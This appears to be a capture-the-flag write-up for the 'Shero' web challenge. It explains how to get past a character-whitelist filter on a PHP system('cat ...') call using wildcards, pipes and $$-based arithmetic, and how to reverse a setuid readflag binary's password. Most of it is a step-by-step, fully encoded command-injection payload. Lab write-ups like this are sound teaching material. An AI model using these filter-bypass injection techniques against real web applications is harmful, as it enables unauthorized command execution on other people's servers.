# Shero

We are greeted with a page that looks like this:

```php
<?php
    $file = $_GET['f'];
    if (!$file) highlight_file(__FILE__);

    if (preg_match('#[^.cat!? /\|\-\[\]\(\)\$]#', $file)) {
        die("cat only");
    }

    if (isset($file)) {
        system("cat " . $file);
    }
?>
```

The preg_match statement forces entries with only the following characters: `. c a t ! ? / | - [ ] ( ) $`, as well as space. This doesn't give us much to work with, but with the letters (cat), we can try to run a couple of different commands. 

We must first close the cat command with the pipe character, before using wildcards to denote some other command. We can first try to run "ls"
```f=c|/???/??```
However, this won't work as there are too many variants that match with the `/???/??` wildcard. This can be confirmed when we run `ls /???/??` on a local linux machine and examine the output. However, there are a few different ways that can be used to list directories with minimal arguments:
- dir
- echo *
- stat <filename>

dir is also too generic and short, we don't have asterisk for echo, but stat can be matched, as confirmed with `ls /???/?tat`

Stat does not "list" the directory in a standard way, it just displays file information for a specific file... or wildcard. Thus to match a file, we just have to keep adding wildcards to the directory that we want to list (in this case, /):
```
  a | /???/???/?tat /?
  a | /???/???/?tat /??
  a | /???/???/?tat /???
  a | /???/???/?tat /????
  a | /???/???/?tat /?????
  a | /???/???/?tat /??????
  a | /???/???/?tat /???????
  a | /???/???/?tat /????????
```
  
The last one gives us something interesting:
```
  File: /flag.txt
  Size: 46        	Blocks: 8          IO Block: 4096   regular file
Device: 5dh/93d	Inode: 1053692     Links: 1
Access: (0400/-r--------)  Uid: ( 1000/     pwn)   Gid: ( 1000/     pwn)
Access: 2022-06-05 16:04:12.797132099 +0000
Modify: 2022-06-04 10:16:04.000000000 +0000
Change: 2022-06-05 16:04:12.649121900 +0000
 Birth: 2022-06-05 16:04:12.645121625 +0000
  File: /readflag
  Size: 16864     	Blocks: 40         IO Block: 4096   regular file
Device: 5dh/93d	Inode: 1053653     Links: 1
Access: (4755/-rwsr-xr-x)  Uid: ( 1000/     pwn)   Gid: ( 1000/     pwn)
Access: 2022-06-05 16:04:12.797132099 +0000
Modify: 2022-06-05 16:03:50.131570395 +0000
Change: 2022-06-05 16:04:12.117085242 +0000
 Birth: 2022-06-05 16:04:12.117085242 +0000
```

A simple cat to /??a?.t?t doesn't work, so we likely have to execute /readflag in order to get the flag. We can first try to download the binary to confirm what needs to be executed:
```bash
wget "http://challs.nusgreyhats.org:12325/?f=/??a???a?"
```

Disassembling the file in IDA gives us the following disassembly:
```
v16 = "P4s5_w0Rd";
s1 = aP4s5W0rd[2];
v5 = aP4s5W0rd[7];
v6 = aP4s5W0rd[0];
v7 = aP4s5W0rd[8];
v8 = aP4s5W0rd[1];
v9 = aP4s5W0rd[3];
v10 = aP4s5W0rd[5];
v11 = aP4s5W0rd[4];
v12 = aP4s5W0rd[6];
v13 = 0;
if ( argc > 1 )
{
  if ( !strcmp(&s1, argv[1]) )
  {
    stream = fopen("/flag.txt", "r");
    if ( stream )
    {
      fgets(&s, 64, stream);
      puts(&s);
      fclose(stream);
      result = 0;
    }
  ...
``` 
To get the flag, we must execute readflag with the right password: `sRPd45w_0`. This is the method that we came up with:
1. Strings the readflag binary and grep it to get P4s5_w0Rd
2. cut the string output to get sRPd45w_0
3. Execute readflag with $() of the above output to get the flag

## Strings the readflag binary and grep it to get P4s5_w0Rd

Strings is fairly straightforward, we can just do `a | /???/???/?t????? /??a???a?`
However, we don't have easy access grep. Instead, we used **/etc/alternatives/nawk** like so:
```
strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/
```
When converted to the acceptable format, we still need the numbers 5 and 4. This can be achieved with a bash numerical expression `$(($$/$$))`.

$$ in bash will return the current PID. By dividing it by itself, we can get 1, and thus make any number by using minus twice:
```
1 is $(($$/$$))
2 is $(($$/$$--$$/$$))
and so on
``` 
Thus, after fully converting the above strings and nawk payload, we get something like this to extract P4s5_w0Rd from readflag:
```
c | /???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/
```

## Cut the string to get sRPd45w_0

In order to get the right mutated password, we used the cut command to give us one character at a time:
```
/usr/bin/cut -c 3
/???/???/c?t -c $(($$/$$--$$/$$--$$/$$))
```

When chained with the full payload above, it gives us this:
```
strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 3
```
When encoded, it looks like this delightful ray of sunshine:
```
at | /???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$))
```

Can you guess what's next?

## Execute readflag with $() of the above output to get the flag

This. This is what's next.
```
/readflag $(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 3)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 8)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 1)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 9)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 2)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 4)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 6)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 5)$(strings /readflag | /etc/alternatives/nawk /5/ | /etc/alternatives/nawk /4/ | cut -c 7)
```

When slowly and painfully converted, this is the answer:
```
at | /??a???a? $(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$)))$(/???/???/?t????? /??a???a? | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$))/ | /???/a?????at????/?a?? /$(($$/$$--$$/$$--$$/$$--$$/$$))/ | /???/???/c?t -c $(($$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$--$$/$$)))
```
